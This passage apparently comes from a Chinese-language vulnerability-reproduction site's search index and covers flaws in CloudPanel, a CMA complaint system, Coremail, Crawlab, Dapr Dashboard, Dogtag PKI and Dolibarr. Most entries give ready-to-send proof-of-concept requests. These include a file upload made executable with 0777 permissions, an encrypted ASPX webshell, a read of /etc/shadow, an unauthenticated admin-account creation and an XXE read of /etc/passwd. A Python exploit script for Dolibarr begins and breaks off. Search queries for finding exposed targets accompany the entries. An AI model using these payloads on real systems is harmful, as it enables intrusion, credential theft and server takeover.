","date":"0001-01-01","objectID":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/:2:0","tags":null,"title":"","uri":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/"},{"categories":null,"content":"网络测绘 title==\"CloudPanel | Log In\" ","date":"0001-01-01","objectID":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/:3:0","tags":null,"title":"","uri":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /file-manager/backend/makefile HTTP/1.1 Host: Accept: */* Connection: keep-alive Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM= Content-Length: 54 Content-Type: application/x-www-form-urlencoded id=/htdocs/app/files/public/\u0026name=Test.php POST /file-manager/backend/text HTTP/1.1 Host: Accept: */* Connection: keep-alive Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM= Content-Length: 289 Content-Type: application/x-www-form-urlencoded id=/htdocs/app/files/public/Test.php\u0026content=\u003c?php phpinfo()?\u003e POST /file-manager/backend/permissions HTTP/1.1 Host: Accept: */* Connection: keep-alive Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM= Content-Length: 65 Content-Type: application/x-www-form-urlencoded id=/htdocs/app/files/public/Test.php\u0026permissions=0777 访问 /Test.php ","date":"0001-01-01","objectID":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/:4:0","tags":null,"title":"","uri":"/cloudpanel-makefile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-35885/"},{"categories":null,"content":"CMA客诉管理系统 upFile.ashx 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 CMA客诉管理系统 upFile.ashx文件存在任意文件上传漏洞，通过漏洞攻击者可以上传任意文件控制服务器 ","date":"0001-01-01","objectID":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 CMA客诉管理系统 ","date":"0001-01-01","objectID":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"CMA客诉管理系统手机端\" ","date":"0001-01-01","objectID":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 发送请求包上传文件 POST /upFile/upFile.ashx HTTP/1.1 Host: Content-Length: 562 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymXf9pBIUlDVOYtnZ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close ------WebKitFormBoundarymXf9pBIUlDVOYtnZ Content-Disposition: form-data; name=\"file\"; filename=\"shell.aspx\" Content-Type: application/octet-stream \u003c%@ Page Language=\"C#\" %\u003e\u003c%@Import Namespace=\"System.Reflection\"%\u003e\u003c%Session.Add(\"k\",\"e45e329feb5d925b\");byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this);%\u003e ------WebKitFormBoundarymXf9pBIUlDVOYtnZ-- 发送后回显路径，使用冰蝎连接 ","date":"0001-01-01","objectID":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/cma%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upfile.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Coremail 路径遍历与文件上传漏洞 ","date":"0001-01-01","objectID":"/coremail-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/coremail-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 监测到Coremail论客邮件系统存在路径遍历与文件上传漏洞，攻击者可利用/lunkr/cache/;/;/../../manager/html 设置参数X-Forwarded-For: 127.0.0.1.Coremail 的 nginx 配置文件中，未针对/lunkr/cache 路径向上解析的时候做 X-Forwarded-For 字段的限制，从而可以利用该接口实现配合利用 nginx 不解析，但 tomcat 解析的差异特性，实现绕过 tomcat manager 的本地 ip 限制。 ","date":"0001-01-01","objectID":"/coremail-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/coremail-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 通过/lunkr/cache/;/;/../../manager/html进入Tomcat控制台，部署war包进行getshell。 ","date":"0001-01-01","objectID":"/coremail-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/coremail-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Coremail 配置信息泄露漏洞 ","date":"0001-01-01","objectID":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等 ","date":"0001-01-01","objectID":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Coremail 配置信息泄露漏洞 ","date":"0001-01-01","objectID":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Coremail邮件系统\" ","date":"0001-01-01","objectID":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 POC为 http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState\u0026dumpConfig=/ ","date":"0001-01-01","objectID":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Crawlab file 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Crawlab 后台 /api/file接口 存在任意文件读取漏洞，攻击者通过漏洞就可以读取服务器中的任意文件 ","date":"0001-01-01","objectID":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Crawlab v0.0.1 ","date":"0001-01-01","objectID":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Crawlab\" ","date":"0001-01-01","objectID":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 首先查看路由位置 main.go 文件 中的 file 接口对应的函数 package routes import ( \"crawlab/utils\" \"github.com/gin-gonic/gin\" \"io/ioutil\" \"net/http\" ) // @Summary Get file // @Description Get file // @Tags file // @Produce json // @Param Authorization header string true \"Authorization token\" // @Success 200 json string Response // @Failure 400 json string Response // @Router /file [get] func GetFile(c *gin.Context) { path := c.Query(\"path\") fileBytes, err := ioutil.ReadFile(path) if err != nil { HandleError(http.StatusInternalServerError, c, err) } c.JSON(http.StatusOK, Response{ Status: \"ok\", Message: \"success\", Data: utils.BytesToString(fileBytes), }) } 接口调用为后台才可调用，通过任意用户添加可以完成绕过 path参数可控，发送Get请求读取任意文件 GET /api/file?path=../../etc/shadow HTTP/1.1 Host: Content-Length: 0 Accept: application/json, text/plain, */* Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwZGQxOWU0YmZjNzg3MDAxZDk1NjBjOSIsIm5iZiI6MTYzOTMwNTI2MiwidXNlcm5hbWUiOiJhZG1pbiJ9.mFRAwXN-QqTmFmPAxgFEJhVXwxVuxJMepHe4khADfgk User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Content-Type: application/json;charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ","date":"0001-01-01","objectID":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/crawlab-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Crawlab users 任意用户添加漏洞 ","date":"0001-01-01","objectID":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Crawlab users 的 api 存在任意用户添加，且添加为未授权接口，可通过添加后在后台进一步攻击 ","date":"0001-01-01","objectID":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Crawlab v0.0.1 ","date":"0001-01-01","objectID":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Crawlab\" ","date":"0001-01-01","objectID":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 首先查看路由位置 main.go 文件 anonymousGrou 中为匿名可调用方法 authGroup 中为认证可调用方法 可以看到 Putuser方法为添加用户，但存在匿名调用 根据字段生成添加用户的请求 PUT /api/users HTTP/1.1 Host: Content-Length: 83 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Content-Type: application/json;charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close {\"username\":\"testppp\",\"password\":\"testppp\",\"role\":\"admin\",\"email\":\"testppp@qq.com\"} ","date":"0001-01-01","objectID":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/crawlab-users-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Dapr Dashboard configurations 未授权访问漏洞 CVE-2022-38817 ","date":"0001-01-01","objectID":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/:0:0","tags":null,"title":"","uri":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/"},{"categories":null,"content":"漏洞描述 Dapr Dashboard 存在 未授权访问漏洞，在未经授权的情况下获取云上redis、mongodb、rabbitmq等应用的明文配置信息，并可以进一步利用这些配置信息获取云上的敏感数据 ","date":"0001-01-01","objectID":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/:1:0","tags":null,"title":"","uri":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/"},{"categories":null,"content":"漏洞影响 Dapr Dashboard ","date":"0001-01-01","objectID":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/:2:0","tags":null,"title":"","uri":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/"},{"categories":null,"content":"网络测绘 \"Dapr Dashboard\" ","date":"0001-01-01","objectID":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/:3:0","tags":null,"title":"","uri":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /configurations ","date":"0001-01-01","objectID":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/:4:0","tags":null,"title":"","uri":"/dapr-dashboard-configurations-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2022-38817/"},{"categories":null,"content":"Dogtag PKI XML实体注入漏洞 CVE-2022-2414 ","date":"0001-01-01","objectID":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/:0:0","tags":null,"title":"","uri":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/"},{"categories":null,"content":"漏洞描述 Dogtag PKI 的XML解析器存在安全漏洞，该漏洞源于在分析 XML 文档时访问外部实体可能会导致 XML 外部实体 （XXE） 攻击。此漏洞允许远程攻击者通过发送特制的 HTTP 请求来潜在地检索任意文件的内容。 ","date":"0001-01-01","objectID":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/:1:0","tags":null,"title":"","uri":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/"},{"categories":null,"content":"漏洞影响 Dogtag PKI ","date":"0001-01-01","objectID":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/:2:0","tags":null,"title":"","uri":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/"},{"categories":null,"content":"网络测绘 title=\"Identity Management\" ","date":"0001-01-01","objectID":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/:3:0","tags":null,"title":"","uri":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /ca/rest/certrequests Content-Type: application/xml \u003c!--?xml version=\"1.0\" ?--\u003e \u003c!DOCTYPE replace [\u003c!ENTITY ent SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cCertEnrollmentRequest\u003e \u003cAttributes/\u003e \u003cProfileID\u003e\u0026ent;\u003c/ProfileID\u003e \u003c/CertEnrollmentRequest\u003e ","date":"0001-01-01","objectID":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/:4:0","tags":null,"title":"","uri":"/dogtag-pki-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-2414/"},{"categories":null,"content":"Dolibarr edit.php 远程命令执行漏洞 CVE-2022-40871 ","date":"0001-01-01","objectID":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/:0:0","tags":null,"title":"","uri":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/"},{"categories":null,"content":"漏洞描述 Dolibarr edit.php 存在远程命令执行漏洞，攻击者通过逻辑漏洞创建管理员后可以通过后台漏洞获取服务器权限 ","date":"0001-01-01","objectID":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/:1:0","tags":null,"title":"","uri":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/"},{"categories":null,"content":"漏洞影响 Dolibarr \u003c= 15.0.3 ","date":"0001-01-01","objectID":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/:2:0","tags":null,"title":"","uri":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/"},{"categories":null,"content":"网络测绘 \"Dolibarr\" ","date":"0001-01-01","objectID":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/:3:0","tags":null,"title":"","uri":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/"},{"categories":null,"content":"漏洞复现 登录页面 利用POC 创建用户进行命令执行 ","date":"0001-01-01","objectID":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/:4:0","tags":null,"title":"","uri":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/"},{"categories":null,"content":"漏洞POC import requests from requests.packages import urllib3 import time import random import sys import re sess = requests.Session() pcre = re.compile(r'name=\\\"token\\\"\\s+value=\\\"([^\u003e]+)\\\"\\s*[/]*\u003e') def request(method, url, headers=None, data=None, proxies=None, timeout=30): i = 1 urllib3.disable_warnings() resp = None proxies = proxies while i \u003c= 3: try: resp = sess.request(method=method, url=url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False) break except requests.exceptions.TooManyRedirects: break except requests.exceptions.ConnectionError as e: time.sleep(2 + random.randint(1, 4)) except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.Timeout): time.sleep(2 + random.randint(1, 4)) finally: i += 1 if i \u003e 3: print('[-]Error retrieve with max retries: {}'.format(url)) return resp def exp(): if len(sys.argv) \u003c 2: sys.exit('Usage: python3 {} http://xxxxx.com/'.format(sys.argv[0])) if sys.argv[1][-1] == '/': base = sys.argv[1].rsplit('/', 1)[0] else: base = sys.argv[1] headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', } #proxies = {'http': 